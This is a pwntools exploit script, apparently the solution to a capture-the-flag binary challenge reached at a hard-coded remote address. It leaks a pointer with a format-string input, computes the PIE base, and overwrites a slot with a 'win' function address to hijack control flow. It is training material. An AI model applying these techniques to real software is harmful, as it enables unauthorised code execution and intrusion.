#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("52.59.124.14",5030)

    return r


def main():
    r = conn()
    r.sendline(b'%8$p')
    r.recvuntil(b"[bouncer] Hah! I'll announce you to the whole market:\n")
    output =  int(r.recvline().strip(b'\n'),16) - 0xdc060
    log.info(f"PIE base : {hex(output)}")
    win = output + 0xdbed0
    log.info(f"WIN function :{hex(win)}")
    r.recvuntil(b'[scribe] Choose where to start (slot index 0..128):\n')
    r.sendline(b'23')
    r.recvuntil(b'[scribe] Choose a tiny adjustment inside the slot (0..15):\n')
    r.sendline(b'8')
    r.recvuntil(b'[scribe] How many bytes of ink? (max 8):\n')
    r.sendline(b'8')
    r.recvuntil(b'[scribe] Ink (raw bytes):\n')
    r.sendline(p64(win))
    r.interactive()


if __name__ == "__main__":
    main()
